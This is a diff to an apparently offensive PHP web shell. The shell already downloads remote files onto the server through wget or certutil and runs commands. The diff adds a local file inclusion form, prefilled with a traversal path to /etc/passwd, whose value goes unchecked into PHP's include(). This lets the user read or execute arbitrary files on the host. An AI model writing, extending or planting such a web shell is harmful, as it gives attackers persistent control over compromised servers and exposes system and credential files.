@@ -111,6 +111,15 @@
 		<input type="submit" name="btnWget" value="Sys Download" <?php echo $disabled?>>
 		<input type="submit" name="btnPhpDownload" value="PHP Download">
 	</form>
+
+	<br>
+
+	<!-- LFI-->
+	<form  method="POST">
+		LFI:
+		<input type="text" name="incFile" size="40" autofocus required value="../../../../../../../../../../etc/passwd">
+        	<input type="submit" name="btnLFI" value="Include">
+	</form>
 </html>
 <?php
 	// Client disconnect will not abort script
@@ -233,14 +242,16 @@
 			"/tmp/$fileName" :
 			"C:/Users/Public/Downloads/$fileName";
 
-	if (isset($_REQUEST['btnWget'])) {
+	if (isset($_REQUEST['btnWget'])) 
+	{
         	$cmd = "$os" == "Linux" ? 
 			"wget $fileFrom -O $fileTo" : 
 			"certutil -urlcache -split -f $fileFrom $fileTo"; // TODO: Check
 		exec_cmd_and_exit($cmdType, $cmd);
     	}
 
-	if (isset($_REQUEST['btnPhpDownload'])) {
+	if (isset($_REQUEST['btnPhpDownload'])) 
+	{
 		echo "# file_put_contents($fileTo, file_get_contents($fileFrom))";
 		echo '<br><br>';
         	if (file_put_contents($fileTo, file_get_contents($fileFrom))) {
@@ -250,5 +261,16 @@
 		}
 		exit();
     	}
+
+	// LFI
+	if (isset($_REQUEST['btnLFI']))
+	{	$incFileName = $_REQUEST['incFile'];
+		
+		echo "# include(\"$incFileName\")";
+		echo '<br><br>';
+
+		include("$incFileName");
+		exit();
+	}
 
 ?>
